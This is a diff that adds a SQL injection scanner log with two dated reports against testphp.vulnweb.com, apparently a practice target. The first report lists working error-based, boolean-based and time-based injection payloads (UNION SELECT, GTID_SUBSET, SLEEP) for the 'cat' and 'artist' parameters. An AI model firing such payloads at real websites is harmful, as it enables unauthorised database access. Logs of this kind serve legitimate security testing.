@@ -1,0 +1,17 @@
+[REPORT] Date/Time: 2024-12-09 10:32:22
+Target URL: http://testphp.vulnweb.com/listproducts.php
+Error-Based SQLi Payloads Found:
+cat=1 AND GTID_SUBSET(CONCAT(0x7170786271,(SELECT (ELT(6874=6874,1))),0x7170716b71),6874)
+artist=-2151 UNION ALL SELECT CONCAT(0x7178707671,0x567547574c665a637768526c7a516379686b7a475178786d484a6472614e55655574556f57686842,0x717a626b71),NULL,NULL-- -
+Boolean-Based SQLi Payloads Found:
+artist=1 AND 9551=9551 AND 1=1
+artist=1 AND (SELECT 3762 FROM (SELECT(SLEEP(5)))WaXU) AND 1=1
+cat=1 AND 3390=3390 AND 1=1
+artist=1 OR (SELECT 9811 FROM (SELECT(SLEEP(5)))rlJi) AND 1=1
+Time-Based SQLi Payloads Found:
+artist=1 AND (SELECT 3762 FROM (SELECT(SLEEP(5)))WaXU)
+artist=1 OR (SELECT 9811 FROM (SELECT(SLEEP(5)))rlJi)
+
+[REPORT] Date/Time: 2025-05-19 12:50:40
+Target URL: http://testphp.vulnweb.com
+No SQL Injection vulnerabilities found.
